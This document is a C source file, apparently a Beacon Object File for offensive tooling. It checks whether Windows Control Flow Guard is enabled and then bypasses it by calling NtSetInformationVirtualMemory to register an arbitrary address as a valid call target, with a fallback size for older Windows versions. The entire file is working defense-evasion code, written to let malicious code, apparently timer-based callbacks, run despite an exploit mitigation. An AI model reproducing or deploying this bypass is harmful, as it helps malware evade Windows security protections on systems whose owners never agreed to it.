#include <windows.h>

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define NtCurrentProcess() ((HANDLE)(ULONG_PTR)-1)

typedef struct {
    ULONG ExtendedProcessInfo;
    ULONG ExtendedProcessInfoBuffer;
} EXTENDED_PROCESS_INFORMATION, * PEXTENDED_PROCESS_INFORMATION;

typedef enum _PROCESSINFOCLASS {
    ProcessUserModeIOPL = 16,
    ProcessCookie = 36
} PROCESSINFOCLASS;

typedef struct _VM_INFORMATION {
    DWORD                 dwNumberOfOffsets;
    PULONG                plOutput;
    PCFG_CALL_TARGET_INFO ptOffsets;
    PVOID                 pMustBeZero;
    PVOID                 pMoarZero;
} VM_INFORMATION, * PVM_INFORMATION;

typedef enum _VIRTUAL_MEMORY_INFORMATION_CLASS {
    VmPrefetchInformation,
    VmPagePriorityInformation,
    VmCfgCallTargetInformation
} VIRTUAL_MEMORY_INFORMATION_CLASS;

typedef struct _MEMORY_RANGE_ENTRY {
    PVOID  VirtualAddress;
    SIZE_T NumberOfBytes;
} MEMORY_RANGE_ENTRY, * PMEMORY_RANGE_ENTRY;

typedef enum _MEMORY_INFORMATION_CLASS {
    MemoryBasicInformation
} MEMORY_INFORMATION_CLASS;

DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQueryInformationProcess     (HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQueryVirtualMemory          (HANDLE, PVOID, MEMORY_INFORMATION_CLASS, PVOID, SIZE_T, PSIZE_T);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtSetInformationVirtualMemory (HANDLE, VIRTUAL_MEMORY_INFORMATION_CLASS, SIZE_T, PMEMORY_RANGE_ENTRY, PVOID, ULONG);

BOOL CfgEnabled()
{
    EXTENDED_PROCESS_INFORMATION procInfo;
    memset(&procInfo, 0, sizeof(EXTENDED_PROCESS_INFORMATION));

    NTSTATUS status = 0;

    procInfo.ExtendedProcessInfo       = ProcessControlFlowGuardPolicy;
    procInfo.ExtendedProcessInfoBuffer = 0;

    status = NTDLL$NtQueryInformationProcess(NtCurrentProcess(), ProcessCookie | ProcessUserModeIOPL, &procInfo, sizeof(procInfo), NULL);

    if (!NT_SUCCESS(status)) {
        return FALSE; 
    } 

    return procInfo.ExtendedProcessInfoBuffer;
}

BOOL BypassCfg(PVOID address)
{
    MEMORY_BASIC_INFORMATION mbi;
    VM_INFORMATION           vmi;
    MEMORY_RANGE_ENTRY       mre;
    CFG_CALL_TARGET_INFO     cti;

    memset(&mbi, 0, sizeof(MEMORY_BASIC_INFORMATION));
    memset(&vmi, 0, sizeof(VM_INFORMATION));
    memset(&mre, 0, sizeof(MEMORY_RANGE_ENTRY));
    memset(&cti, 0, sizeof(CFG_CALL_TARGET_INFO));

    NTSTATUS status = NTDLL$NtQueryVirtualMemory(NtCurrentProcess(), address, MemoryBasicInformation, &mbi, sizeof(mbi), 0);

    if (!NT_SUCCESS(status)) {
        return FALSE;
    }

    if (mbi.State != MEM_COMMIT || mbi.Type != MEM_IMAGE) {
        return FALSE;
    }

    cti.Offset = (ULONG_PTR)address - (ULONG_PTR)mbi.BaseAddress;
    cti.Flags = CFG_CALL_TARGET_VALID;

    mre.NumberOfBytes  = (SIZE_T)mbi.RegionSize;
    mre.VirtualAddress = (PVOID)mbi.BaseAddress;

    ULONG dwOutput = 0;

    vmi.dwNumberOfOffsets = 0x1;
    vmi.plOutput          = &dwOutput;
    vmi.ptOffsets         = &cti;
    vmi.pMustBeZero       = 0x0;
    vmi.pMoarZero         = 0x0;

    status = NTDLL$NtSetInformationVirtualMemory(NtCurrentProcess(), VmCfgCallTargetInformation, 1, &mre, (PVOID)&vmi, (ULONG)sizeof(vmi));

    if (status == 0xC00000F4) {
        /* the size parameter is not valid. try 24 instead, which is a known size for older windows versions */
        status = NTDLL$NtSetInformationVirtualMemory(NtCurrentProcess(), VmCfgCallTargetInformation, 1, &mre, (PVOID)&vmi, 24);
    }

    if (!NT_SUCCESS(status)) {
        /* STATUS_INVALID_PAGE_PROTECTION - CFG wasn't enabled */ 
        if (status == 0xC0000045) {
            /* pretend we bypassed it so timers can continue */
            return TRUE;
        }
        return FALSE;
    }

    return TRUE;
}